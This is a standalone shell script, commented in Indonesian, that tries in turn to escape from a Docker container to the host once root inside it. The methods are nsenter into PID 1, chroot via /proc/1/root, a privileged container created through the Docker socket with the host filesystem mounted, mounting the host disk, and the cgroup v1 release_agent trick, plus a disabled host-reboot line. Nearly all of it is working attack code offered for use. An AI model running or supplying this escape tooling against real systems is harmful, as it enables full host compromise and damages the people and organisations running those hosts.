#!/bin/sh
# Docker escape — sudah root di dalam container
# Usage: sh escape.sh [cmd]   default: sh (interactive shell di host)
set -e

CMD="${1:-sh}"
log() { printf '\033[94m[*]\033[0m %s\n' "$*"; }
ok()  { printf '\033[92m[+]\033[0m %s\n' "$*"; }
err() { printf '\033[91m[-]\033[0m %s\n' "$*"; }

# ── E1: nsenter ke PID 1 (paling reliable jika root) ──────────────────────
log "E1: nsenter --target 1 (semua namespace)"
if command -v nsenter >/dev/null 2>&1; then
  nsenter --target 1 --mount --uts --ipc --net --pid -- "$CMD" && exit 0
  err "E1 failed"
else
  err "nsenter not found"
fi

# ── E2: chroot ke /proc/1/root ─────────────────────────────────────────────
log "E2: chroot /proc/1/root"
if [ -d /proc/1/root ] && [ -x /proc/1/root/bin/sh ]; then
  chroot /proc/1/root "$CMD" && exit 0
  err "E2 failed"
else
  err "E2: /proc/1/root not accessible"
fi

# ── E3: Docker socket ──────────────────────────────────────────────────────
log "E3: Docker socket"
for SOCK in /var/run/docker.sock /run/docker.sock; do
  [ -S "$SOCK" ] || continue
  ok "Socket found: $SOCK"
  # Jalankan container baru dengan mount host /
  CID=$(curl -s --unix-socket "$SOCK" \
    -X POST \
    -H 'Content-Type: application/json' \
    -d "{\"Image\":\"alpine\",\"Cmd\":[\"/bin/sh\",\"-c\",\"chroot /host $CMD\"],\"Binds\":[\"/:/host\"],\"Privileged\":true}" \
    http://localhost/containers/create | grep -o '"Id":"[^"]*"' | cut -d'"' -f4)
  [ -z "$CID" ] && { err "E3: container create failed"; continue; }
  curl -s --unix-socket "$SOCK" -X POST "http://localhost/containers/$CID/start"
  sleep 1
  curl -s --unix-socket "$SOCK" "http://localhost/containers/$CID/logs?stdout=1&stderr=1"
  curl -s --unix-socket "$SOCK" -X DELETE "http://localhost/containers/$CID?force=true" >/dev/null
  exit 0
done
err "E3: no docker socket"

# ── E4: mount block device (privileged container) ─────────────────────────
log "E4: mount host disk (privileged)"
DISK=""
for d in /dev/sda1 /dev/sda /dev/vda1 /dev/vda /dev/xvda1 /dev/xvda; do
  [ -b "$d" ] && { DISK="$d"; break; }
done
if [ -n "$DISK" ]; then
  ok "Block device found: $DISK"
  MNT=$(mktemp -d)
  mount "$DISK" "$MNT" 2>/dev/null || mount -o ro "$DISK" "$MNT"
  ok "Mounted $DISK at $MNT"
  # chroot + nsenter agar dapat host PID namespace juga
  if command -v nsenter >/dev/null 2>&1; then
    nsenter --target 1 --mount --uts --ipc --net --pid -- chroot "$MNT" "$CMD" && exit 0
  fi
  chroot "$MNT" "$CMD" && exit 0
  umount "$MNT"; rmdir "$MNT"
  err "E4 failed"
else
  err "E4: no block device found (not privileged?)"
fi

# ── E5: cgroup v1 release_agent ───────────────────────────────────────────
log "E5: cgroup v1 release_agent"
CGROOT=""
for line in $(cat /proc/mounts); do
  # cari mount type=cgroup (v1)
  :
done
CGV1=$(awk '$3=="cgroup" && $4~/memory/{print $2; exit}' /proc/mounts)
if [ -n "$CGV1" ]; then
  ok "CgroupV1 at $CGV1"
  CHILD="$CGV1/esc$$"
  mkdir -p "$CHILD"
  echo 1 > "$CGV1/notify_on_release"
  echo 1 > "$CHILD/notify_on_release"
  PAYLOAD=/tmp/.cg_payload
  OUTPUT=/tmp/.cg_out
  printf '#!/bin/sh\n%s > %s 2>&1\n' "$CMD" "$OUTPUT" > "$PAYLOAD"
  chmod +x "$PAYLOAD"
  echo "$PAYLOAD" > "$CGV1/release_agent"
  # Trigger: masukkan subshell ke cgroup lalu keluar
  sh -c "echo \$$ > $CHILD/cgroup.procs && exit 0"
  sleep 2
  [ -s "$OUTPUT" ] && { ok "E5 output:"; cat "$OUTPUT"; exit 0; }
  rmdir "$CHILD" 2>/dev/null || true
  err "E5 failed"
else
  err "E5: no cgroup v1 (target is v2)"
fi

# ── E6: /proc/sysrq-trigger (nuklir — jangan dipakai sembarangan) ─────────
# echo b > /proc/sysrq-trigger  ← reboot host, skip

err "Semua metode gagal"
err "Cek manual: mount | grep -v container, ls /dev/sd*, capsh --print"
exit 1
